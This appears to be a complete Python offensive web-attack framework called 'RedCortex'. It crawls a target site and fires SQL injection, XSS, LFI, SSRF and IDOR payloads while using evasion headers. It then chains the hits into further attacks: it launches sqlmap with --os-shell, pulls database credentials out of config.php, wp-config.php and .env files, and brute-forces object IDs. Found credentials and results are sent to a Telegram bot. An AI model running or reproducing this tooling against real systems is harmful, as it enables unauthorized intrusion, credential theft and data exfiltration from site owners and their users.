#!/usr/bin/env python3
"""
RedCortex - Ultimate Red Team Web Pentest Framework
Dirsearch, Playwright, Plugins (SQLi, XSS, LFI, SSRF, IDOR), Exploit Chaining, Session, Telegram, Dashboard
"""

import requests, random, time, argparse, sys, json, threading, csv, pickle, subprocess, glob, os, re
from bs4 import BeautifulSoup
from flask import Flask, jsonify, request
from playwright.sync_api import sync_playwright

TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:52.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2)",
    "Mozilla/5.0 (Android 10; SM-G973F)"
]
TAMPERS = ["space2comment", "between", "randomcase", "charencode"]

def evasion_headers():
    ua = random.choice(USER_AGENTS)
    return {"User-Agent": ua, "X-Forwarded-For": ".".join(str(random.randint(0,255)) for _ in range(4))}
def evasion_delay(min_delay=0.4, max_delay=1.7): time.sleep(random.uniform(min_delay, max_delay))
def send_telegram(msg):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"}
    try: requests.post(url, data=payload, timeout=7)
    except: pass
def save_session(filename, obj): pickle.dump(obj, open(filename,"wb"))
def load_session(filename): return pickle.load(open(filename,"rb")) if os.path.exists(filename) else {}

def run_dirsearch(target_url, wordlist="SecLists/Discovery/Web-Content/common.txt"):
    cmd = ["python3", "dirsearch/dirsearch.py", "-u", target_url,
            "-e", "php,asp,aspx,html", "-w", wordlist, "--plain-text-report=found_endpoints.txt"]
    subprocess.run(cmd)
    endpoints = set()
    try:
        with open("found_endpoints.txt") as f:
            for line in f:
                endpoint = line.strip().split()[0]
                if "http" in endpoint and "200" in line:
                    endpoints.add(endpoint)
    except Exception: pass
    return list(endpoints)

def browser_crawl(url):
    endpoints, params = set(), set()
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            page.goto(url, timeout=60000)
            endpoints.update([a.get_attribute("href") for a in page.query_selector_all("a[href]") if a.get_attribute("href")])
            for form in page.query_selector_all("form"):
                for inp in form.query_selector_all("input[name]"):
                    params.add(inp.get_attribute("name"))
            browser.close()
    except Exception as e:
        print(f"Playwright error: {e}")
    return list(filter(None,endpoints)), list(filter(None,params))

def html_param_parse(url):
    params = set()
    try:
        html = requests.get(url, timeout=8).text
        soup = BeautifulSoup(html, 'html.parser')
        for form in soup.find_all("form"):
            for input in form.find_all("input"):
                name = input.get("name")
                if name: params.add(name)
        for a in soup.find_all("a", href=True):
            href = a['href']
            if '?' in href:
                args = href.split('?',1)[1].split('&')
                for arg in args:
                    if '=' in arg: params.add(arg.split('=')[0])
    except Exception as e:
        pass
    return list(params)

def brute_param_list(dictionary="SecLists/Fuzzing/parameter-names.txt"):
    params = set()
    try:
        with open(dictionary) as f:
            params.update(line.strip() for line in f if line.strip())
    except Exception: pass
    return list(params)

class VulnPlugin:
    def run(self, url, params, session, original_sqlcode=None): return []
class SQLiPlugin(VulnPlugin):
    def run(self, url, params, session, original_sqlcode=None):
        TAMPERS = ["", "space2comment", "between", "randomcase", "charencode"]
        BOOLEAN_PAYLOADS = [("1 AND 1=1", "1 AND 1=2"), ("1' AND 1=1-- -", "1' AND 1=2-- -"), ('1") AND 1=1-- -', '1") AND 1=2-- -'), ("1 OR 1=1", "1 OR 1=2")]
        ERROR_PAYLOADS = ["'", '"', "1'", '1")', "1'--", '1")--']
        UNION_PAYLOADS = ["1 UNION SELECT NULL-- -", "1' UNION SELECT 1,2,3-- -"]
        ERROR_SIGNATURES = ["SQL syntax", "mysql_fetch", "ODBC", "Warning", "error in your SQL", "Query failed", "near", "unterminated", "Unknown column",
            "ORA-", "PG::", "psql:", "sqlite", "syntax error", "invalid input"]
        hits = []
        for param_name in params:
            for tamper in TAMPERS:
                for true_pay, false_pay in BOOLEAN_PAYLOADS:
                    p_true, p_false = dict(params), dict(params)
                    p_true[param_name] = true_pay
                    p_false[param_name] = false_pay
                    try:
                        sc_true, b_true = self._req(url, p_true)
                        sc_false, b_false = self._req(url, p_false)
                        if sc_true == sc_false == 200 and abs(len(b_true) - len(b_false)) > 8:
                            hits.append(["SQLi-Boolean", url, param_name, true_pay, tamper])
                            return hits
                    except: continue
                for pay in ERROR_PAYLOADS:
                    p_e = dict(params)
                    p_e[param_name] = pay
                    try:
                        sc, b = self._req(url, p_e)
                        if any(sig in b for sig in ERROR_SIGNATURES):
                            hits.append(["SQLi-Error", url, param_name, pay, tamper])
                            return hits
                    except: continue
                for up in UNION_PAYLOADS:
                    p_u = dict(params)
                    p_u[param_name] = up
                    try:
                        sc, b = self._req(url, p_u)
                        for marker in ["NULL", "1", "2", "3"]:
                            if marker in b:
                                hits.append(["SQLi-Union", url, param_name, up, tamper])
                                return hits
                    except: continue
        return hits

    def _req(self, url, params):
        resp = requests.get(url, params=params, headers=evasion_headers(), timeout=12)
        return resp.status_code, resp.text

class XSSPlugin(VulnPlugin):
    def run(self, url, params, session, original_sqlcode=None):
        test_params = dict(params); k = next(iter(params)) if params else "q"
        test_params[k] = "<svg onload=alert(69)>"
        try:
            r = requests.get(url, params=test_params, headers=evasion_headers(), timeout=7)
            if "<svg onload=alert(69)>" in r.text: return ["XSS", url, dict(test_params)]
        except: pass
        return []
class LFIPlugin(VulnPlugin):
    def run(self, url, params, session, original_sqlcode=None):
        for k in params:
            test_params = dict(params)
            test_params[k] = "../../etc/passwd"
            try:
                r = requests.get(url, params=test_params, headers=evasion_headers(), timeout=8)
                if "root:" in r.text and "/bin/bash" in r.text: return ["LFI", url, dict(test_params)]
            except: pass
        return []
class SSRFPlugin(VulnPlugin):
    def run(self, url, params, session, original_sqlcode=None):
        for k in params:
            test_params = dict(params)
            test_params[k] = "http://127.0.0.1/"
            try:
                r = requests.get(url, params=test_params, headers=evasion_headers(), timeout=8)
                if ("localhost" in r.text or "127.0." in r.text): return ["SSRF", url, dict(test_params)]
            except: pass
        return []
class IDORPlugin(VulnPlugin):
    def run(self, url, params, session, original_sqlcode=None):
        for k in params:
            tryid = "2" if params[k]=="1" else "1"
            test_params = dict(params); test_params[k] = tryid
            try: r = requests.get(url, params=test_params, headers=evasion_headers(), timeout=7)
            except: continue
            if r.status_code==200 and len(r.content) > 50: return ["IDOR", url, dict(test_params)]
        return []

vuln_plugins = [SQLiPlugin(), XSSPlugin(), LFIPlugin(), SSRFPlugin(), IDORPlugin()]
def plugin_scan(endpoint, paramset, session, original_sqlcode=None):
    results = []
    for plugin in vuln_plugins:
        result = plugin.run(endpoint, paramset, session, original_sqlcode)
        if result: results.append(result)
    return results

def exploit_chain(hit, session):
    # SQLi chain 
    if hit[0].startswith("SQLi") and "OS-Shell" not in hit:
        print(f"[Automated Chain] Trying OS shell via sqlmap on {hit[1]} param {hit[2]}")
        try:
            target_url = hit[1]
            param = hit[2]
            cmd = [
                "python3", "sqlmap.py", "-u", target_url + "?" + f"{param}=' OR 1=1--",
                "--batch", "--os-shell", "--threads=4", "--random-agent",
                "--risk=3", "--level=5", "--tamper=space2comment,between,randomcase,charencode",
                "-p", param
            ]
            print(f"[Chain] Running: {' '.join(cmd)}")
            subprocess.run(cmd)
        except Exception as e:
            print(f"Chain error: {e}")
        return

    # LFI chain: auto-fetch config file and parse for credentials
    if hit[0] == "LFI":
        for k,v in hit[2].items():
            # Attempt to fetch common config files for credential parsing
            for config_name in ["config.php", "wp-config.php", "database.php", ".env"]:
                test_params = dict(hit[2])
                test_params[k] = f"../../{config_name}"
                try:
                    resp = requests.get(hit[1], params=test_params, headers=evasion_headers(), timeout=10)
                    if resp.status_code == 200 and len(resp.text) > 24:
                        creds = []
                        for line in resp.text.splitlines():
                            # Parse typical creds
                            for regex in [r"['\"](?:user|username|db_user)['\"]?\s*[,:=]\s*['\"](.+?)['\"]",
                                          r"['\"](?:pass|password|db_pass)['\"]?\s*[,:=]\s*['\"](.+?)['\"]",
                                          r"DB_USER\s*=\s*['\"]?(.+?)['\"]?",
                                          r"DB_PASS\s*=\s*['\"]?(.+?)['\"]?"]:
                                m = re.search(regex, line, re.I)
                                if m: creds.append((config_name, m.group(1)))
                        if creds:
                            session.setdefault("auto_creds", []).extend(creds)
                            print(f"[Chain][LFI] Found credentials in {config_name}: {creds}")
                            send_telegram(f"[Chain][LFI] Found credentials in {config_name}: {creds}")
                except Exception as e:
                    print(f"[Chain][LFI/config] error: {e}")
        return

    # IDOR chain: brute/pivot more IDs and login targets
    if hit[0] == "IDOR":
        base_url = hit[1]
        param_name = next(iter(hit[2]))
        print(f"[Automated Chain][IDOR] Brute-forcing additional IDs for param {param_name} on {base_url}")
        for test_id in range(1,21): # Try IDs 1-20
            params = dict(hit[2])
            params[param_name] = str(test_id)
            try:
                resp = requests.get(base_url, params=params, headers=evasion_headers(), timeout=7)
                if resp.status_code==200 and len(resp.content) > 70:
                    found_strings = [w for w in ["admin", "password", "token", "secret"] if w in resp.text.lower()]
                    if found_strings:
                        print(f"[Chain][IDOR] ID {test_id} found interesting data ({found_strings}): {base_url}?{param_name}={test_id}")
                        send_telegram(f"[Chain][IDOR] Found: {base_url}?{param_name}={test_id} ({found_strings})")
            except Exception as e:
                continue
# --- FLASK DASHBOARD & RESULTS ---
app = Flask(__name__)
attack_results = []

@app.route('/report', methods=['GET'])
def get_report():
    return jsonify({"results": attack_results})

def run_dashboard():
    threading.Thread(target=app.run, kwargs={"port": 8088, "debug": False}).start()

# --- Attack path graph mapping (simple stdout, optional for further matplotlib/networkx visualization) ---
def print_attack_chain(chain):
    print("\n[Attack Path Chain Topology]:")
    for step in chain:
        if step["results"]:
            for res in step["results"]:
                print(f"{step['endpoint']} --[{res[0]}]--> {res[2] if len(res) > 2 else ''}")

# --- INTERACTIVE SHELL (simplified) ---
def interactive_shell(results):
    print("\n=== Interactive Exploit Shell ===")
    print("Type 'exit' to leave. Provide endpoint/param and POC payload to exploit.")
    while True:
        cmd = input("cmd> ").strip()
        if cmd in ("exit","quit"): break
        print(f"Simulated shell command: {cmd} -- (implement dynamic SQL/HTTP as needed)")

# --- MAIN WORKFLOW ---
def main():
    parser = argparse.ArgumentParser("GOLDMINE Advanced - Web Red Team Framework (dashboard, reporting, chaining)")
    parser.add_argument("--url", help="Target site root", required=True)
    parser.add_argument("--session", default="ultimate_recon.pkl", help="Session filename")
    args = parser.parse_args()

    try:
        state = load_session(args.session) if args.session else {"results":[], "chain":[]}
    except Exception: state = {"results":[], "chain":[]}

    run_dashboard()
    print("[*] Dashboard running on http://localhost:8088/report")

    print("[*] Dirsearch endpoint brute ...")
    endpoints = run_dirsearch(args.url)
    browser_eps, browser_params = browser_crawl(args.url)
    all_eps = set(endpoints + browser_eps + [args.url])
    all_params = set(browser_params + brute_param_list())
    print(f"[+] Endpoints total: {len(all_eps)}, Params found: {len(all_params)}")

    # Main scan loop
    for ep in all_eps:
        evasion_delay()
        try:
            print(f"\n[*] Scanning {ep} ...")
            params = {p: "1" for p in all_params if p}  # Fuzz all params
            params.update({p:"1" for p in html_param_parse(ep)})
            results = plugin_scan(ep, params, state)
            for hit in results:
                print("[*] HIT:", hit)
                attack_results.append(hit)
                send_telegram(str(hit))
                exploit_chain(hit, state)
            state["results"] += results
            state["chain"].append({"endpoint": ep, "params": params, "results": results})
            save_session(args.session, state)
        except Exception as e:
            print(f"[Error: {e}] Continuing...")

    print_attack_chain(state["chain"])
    send_telegram("\n".join([f"{s['endpoint']}: {s['results']}" for s in state["chain"]]))

    interactive_shell(state["results"])

if __name__ == "__main__":
    main()
